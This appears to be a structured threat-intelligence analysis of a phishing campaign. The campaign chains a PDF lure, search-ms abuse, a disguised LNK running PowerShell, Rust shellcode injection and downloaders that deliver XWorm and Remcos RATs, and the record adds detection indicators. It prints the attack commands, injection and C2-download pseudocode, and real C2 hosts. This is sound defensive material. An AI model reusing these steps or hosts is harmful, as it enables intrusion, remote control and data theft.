package_info.package_manager: Custom/Manual (malware distributed as DLL/EXE, not via public package manager)
package_info.why_malicious: The packages are designed to inject and execute malicious shellcode, evade endpoint detection and response (EDR) solutions, and deliver commodity remote access trojans (RATs) such as XWorm and Remcos. They employ multiple anti-analysis, anti-forensics, and persistence techniques, and are used as part of a sophisticated phishing and malware delivery chain.

malicious_snippets.code_behavior: When the user opens the PDF and clicks the concealed button, the code causes the PDF reader to connect to a remote URL, leading to further stages of the attack.

malice_analysis.why_suspicious: Embedding a hidden URL in a PDF stream object is a common phishing tactic to evade detection and lure users to malicious sites.
malice_analysis.violated_expectations: Normal PDFs do not contain hidden URLs that redirect users to malicious web pages.
malice_analysis.similar_legitimate_use: Some PDFs may contain legitimate links, but not hidden in stream objects with obfuscation.
key_indicators: URL hidden in PDF stream object

execution_context.trigger: user interaction (HTML file loaded via browser)

malicious_snippets.code_snippet: HTML uses search-ms protocol to trigger: search-ms:query=ORDER_SPEC0723&crumb=location:C:\Users\Public\Documents
malicious_snippets.code_behavior: When the user loads the HTML, it triggers the search-ms protocol, causing Windows to display a remote folder containing a malicious LNK file disguised as a PDF.

malice_analysis.why_suspicious: Abuse of the search-ms protocol to present a remote LNK file is a novel technique to bypass browser download restrictions and social engineer the user.
malice_analysis.violated_expectations: Legitimate HTML files do not trigger OS-level search protocols to present disguised executables.
key_indicators: Use of search-ms protocol in HTML
Remote LNK file disguised as PDF

execution_context.file_location: LNK file on remote server (masquerading as PDF)

malicious_snippets.code_snippet: LNK file executes: powershell.exe -ExecutionPolicy Bypass -File pf.ps1
malicious_snippets.code_behavior: When the user clicks the LNK file, it launches a PowerShell script (pf.ps1) with execution policy bypassed, enabling further malware execution.

malice_analysis.why_suspicious: LNK files that execute PowerShell scripts are a common malware delivery vector, especially when disguised as documents.
malice_analysis.violated_expectations: Legitimate LNK files should not execute PowerShell scripts from user-accessible folders.

malicious_snippets.code_snippet:
regsvr32 /s doc.dll
Start-Process T.pdf
Start-Process AA.exe
Stop-Process -Name explorer -Force
malicious_snippets.code_behavior: At script execution, the code uses regsvr32 to load a malicious DLL (doc.dll), opens a decoy PDF, executes a downloader (AA.exe), and kills all File Explorer windows to reduce user awareness.

malice_analysis.why_suspicious: Chaining DLL injection, decoy document display, and process termination is a classic malware tactic to distract the user and execute payloads.
malice_analysis.violated_expectations: Legitimate scripts do not load DLLs via regsvr32 or kill explorer processes after opening a document.
key_indicators: Simultaneous execution of decoy and malware

malicious_snippets.code_snippet:
// Pseudocode
CreateProcessA('notepad.exe', CREATE_SUSPENDED)
shellcode = Base64Decode(LZMADecompress(shellcode_data))
WriteProcessMemory(notepad.exe, shellcode)
ResumeThread(notepad.exe)
malicious_snippets.code_behavior: Upon DLL load, the code creates a suspended notepad.exe process, decodes and decompresses shellcode, injects it into the process memory, and resumes execution, running the malicious payload.

malice_analysis.why_suspicious: Process injection with decoded shellcode is a hallmark of malware, especially when using uncommon languages (Rust) and evasion techniques.
malice_analysis.violated_expectations: Legitimate DLLs do not inject shellcode into unrelated processes.
key_indicators: Use of uncommon language (Rust) for injection

malicious_snippets.code_behavior: At runtime, the shellcode disables Windows security features (AMSI, WDLP) and executes a .NET-based RAT (XWorm) in memory.

malice_analysis.why_suspicious: Bypassing security controls and running in-memory payloads are advanced evasion and persistence techniques.
malice_analysis.violated_expectations: Legitimate code does not disable security features or execute hidden payloads in memory.

malicious_snippets.code_snippet:
// Pseudocode
download('95.214.27.17/storage/NAR')
download('plunder.ddnsguru.com/storage/NAR')
decoded_data = decode(downloaded_data, key='760')
load SYK Crypter from decoded_data
malicious_snippets.code_behavior: At execution, the downloader fetches payloads from hardcoded URLs, decodes them using a static key, and loads the next-stage crypter (SYK Crypter).

malice_analysis.why_suspicious: Hardcoded C2 URLs and custom decoding are typical of staged malware delivery.
malice_analysis.violated_expectations: Legitimate downloaders do not fetch and decode executables from suspicious remote servers.

malicious_snippets.code_behavior: At runtime, the crypter checks for debuggers, decrypts and decompresses its payload, loads additional .NET code, and injects the final RAT (Remcos) into a process.

malice_analysis.why_suspicious: Anti-debugging, multi-stage decryption, and process injection are all advanced malware behaviors.
malice_analysis.violated_expectations: Legitimate software does not perform anti-debugging checks or inject decrypted payloads into other processes.

malicious_snippets.code_behavior: During execution, the malware copies itself to the Startup folder and creates a registry Run key for persistence.

malice_analysis.why_suspicious: Self-copying to Startup and registry Run key creation are classic persistence mechanisms for malware.
malice_analysis.violated_expectations: Legitimate installers do not silently add themselves to autorun locations without user consent.

execution_context.trigger: Remcos RAT execution (injected by SYK Crypter)

malicious_snippets.code_behavior: At runtime, the RAT connects to a C2 server, exfiltrates sensitive data, and enables remote control of the victim's device.

malice_analysis.why_suspicious: Remote access, data exfiltration, and C2 communication are core RAT behaviors.
malice_analysis.violated_expectations: Legitimate software does not exfiltrate user data or provide remote control to unknown servers.

attack_chain.action: Phishing email delivers PDF with hidden malicious URL.
attack_chain.leads_to: Victim opens PDF and clicks concealed button.

attack_chain.action: Victim is redirected to malicious HTML page using search-ms protocol.
attack_chain.leads_to: Victim sees remote folder with disguised LNK file.

attack_chain.action: Victim clicks LNK file, which executes PowerShell script.
PowerShell script loads Rust injector DLL, opens decoy PDF, executes downloader, and kills explorer.
attack_chain.leads_to: Rust injector (doc.dll) and downloader (AA.exe) are executed.

attack_chain.action: Rust injector (doc.dll) injects shellcode into suspended process.
Shellcode disables security features and runs XWorm RAT.
Downloader (AA.exe) fetches and decodes SYK Crypter payload.
attack_chain.leads_to: SYK Crypter is loaded and executed.

attack_chain.action: SYK Crypter decrypts and injects Remcos RAT, checks for security tools.
attack_chain.leads_to: Remcos RAT is injected and executed.

attack_chain.action: SYK Crypter establishes persistence via Startup folder and registry.
Remcos RAT connects to C2, exfiltrates data, and enables remote control.
attack_chain.leads_to: Attacker gains full control and data exfiltration capabilities.

behavioral_signatures: PDFs with hidden URLs in stream objects
HTML files using search-ms protocol to present remote LNK files
LNK files disguised as documents executing PowerShell scripts
PowerShell scripts loading DLLs via regsvr32 and killing explorer.exe
Rust-based DLLs performing process injection with Base64/LZMA/RC4 shellcode
Shellcode disabling AMSI/WDLP and running in-memory .NET payloads
MSIL downloaders fetching payloads from hardcoded C2 URLs
Crypters performing anti-debugging, RC4 decryption, and process injection
Malware establishing persistence via Startup folder and registry Run keys
RATs connecting to known C2 infrastructure and exfiltrating data
file_indicators: LNK files with PowerShell execution commands
SYK Crypter DLL with resource SYKSBIKO
Presence of XWorm or Remcos binaries in memory
network_indicators: Connections to: 95.214.27.17, plunder.ddnsguru.com, freshinxworm.ddns.net, churchxx.ddns.net, plunder.dedyn.io, plunder.jumpingcrab.com, plunder.dynnamn.ru
C2 traffic to pastebin.com (for XWorm configuration)
Outbound connections from injected processes (notepad.exe, etc.)
detection_knowledge.how_to_detect: Monitor for PDFs with hidden URLs in stream objects and HTML files using the search-ms protocol. Detect LNK files that launch PowerShell with ExecutionPolicy Bypass, especially when disguised as documents. Flag PowerShell scripts that load DLLs via regsvr32, open decoy documents, and kill explorer.exe. Identify Rust-based DLLs performing process injection with obfuscated shellcode. Watch for MSIL downloaders fetching payloads from suspicious domains and performing custom decoding. Detect persistence mechanisms involving self-copy to Startup and registry Run keys. Monitor for in-memory execution of XWorm or Remcos, and outbound connections to known C2 infrastructure.
